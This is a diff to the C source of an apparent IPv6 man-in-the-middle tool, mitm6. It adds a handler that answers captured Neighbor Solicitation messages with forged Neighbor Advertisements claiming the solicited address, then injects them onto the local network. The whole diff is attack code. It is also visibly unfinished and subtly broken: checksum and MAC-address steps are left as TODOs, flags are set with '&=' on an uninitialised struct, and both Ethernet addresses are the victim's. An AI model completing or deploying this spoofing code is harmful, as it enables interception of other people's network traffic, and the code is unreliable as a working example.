@@ -22,33 +22,54 @@
 #include <arpa/inet.h>
 
 #include "mitm6.h"
+#include "packet.h"
 
 void ndp_spoof(const u_char *bytes, size_t len)
 {
-        size_t totlen = 0;
         struct ether_header *ether = NULL;
         struct ip6_hdr *ip = NULL;
         struct icmp6_hdr *icmp = NULL;
-        char str_addr[INET6_ADDRSTRLEN];
+        struct nd_neighbor_solicit *ns = NULL;
+        struct nd_neighbor_advert na;
+        char sspoof[INET6_ADDRSTRLEN];
+        struct packet *p = NULL;
 
         ether = (struct ether_header *)bytes;
         ip = (struct ip6_hdr *)(bytes + sizeof(struct ether_header));
 
-        /* bzero(str_addr, INET6_ADDRSTRLEN); */
-        /* inet_ntop(AF_INET6, &(ip->ip6_src), str_addr, INET6_ADDRSTRLEN); */
-        /* debug("SRC IP6: %s", str_addr); */
-
-        /* bzero(str_addr, INET6_ADDRSTRLEN); */
-        /* inet_ntop(AF_INET6, &(ip->ip6_dst), str_addr, INET6_ADDRSTRLEN); */
-        /* debug("DST IP6: %s", str_addr); */
-
-        if (ip->ip6_nxt == IPPROTO_ICMPV6)
-                icmp = (struct icmp6_hdr *)(bytes + sizeof(struct ether_header) 
-                                            + sizeof(struct ip6_hdr));
-        else
-                warning("SKIP IPv6 EXTENSION HEADERS!!!");
+        if (ip->ip6_nxt == IPPROTO_ICMPV6) {
+                icmp = (struct icmp6_hdr *)(bytes + sizeof(struct ether_header) + sizeof(struct ip6_hdr));
+        } else {
+                /* TODO */
+                warning("SKIP IP6 EXTENSION HEADERS!!! -- skipping packet");
+                return;
+        }
         
         if (icmp->icmp6_type == ND_NEIGHBOR_SOLICIT) {
-                debug(">>>> INJECT!!!");
+                ns = (struct nd_neighbor_solicit *)icmp;
+
+                bzero(sspoof, INET6_ADDRSTRLEN);
+                inet_ntop(AF_INET6, &(ns->nd_ns_target), sspoof, 
+                          INET6_ADDRSTRLEN);
+                printf("Spoofing %s\n", sspoof);
+
+                /* Prepare NA message */
+                na.nd_na_hdr.icmp6_type = ND_NEIGHBOR_ADVERT;
+                na.nd_na_hdr.icmp6_code = 0;
+                na.nd_na_hdr.icmp6_cksum = 0;
+                na.nd_na_hdr.icmp6_data32[0] &= 0xC0000000;
+                /* na.nd_na_hdr.icmp6_data32[0] &= 0x40000000; */
+                na.nd_na_target = ns->nd_ns_target;
+
+                /* TODO: cksum */
+
+                /* TODO: insert my mac address!!! */
+                p = packet_init();
+                packet_add_ether(p, ether->ether_shost, ether->ether_shost, ETH_P_IPV6);
+                packet_add_ip6(p, sizeof(struct nd_neighbor_advert), IPPROTO_ICMPV6, 64, &(ns->nd_ns_target), &(ip->ip6_src), (u_char *)&na);
+
+                inject_packet(p->data, p->len);
+
+                packet_free(p);
         }
 }
